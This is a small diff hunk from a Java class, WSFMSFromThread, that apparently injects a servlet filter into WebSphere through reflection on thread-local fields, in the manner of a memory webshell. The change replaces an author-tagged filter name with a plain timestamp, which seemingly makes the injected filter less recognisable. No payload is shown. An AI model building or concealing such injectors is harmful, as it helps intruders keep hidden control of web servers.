@@ -15,7 +15,7 @@ public class WSFMSFromThread implements Filter {
 
 	static {
 		try {
-			String filterName = "su18" + System.nanoTime();
+			String filterName = String.valueOf(System.nanoTime());
 
 			Class                   clazz = Thread.currentThread().getClass();
 			java.lang.reflect.Field field = clazz.getDeclaredField("wsThreadLocals");
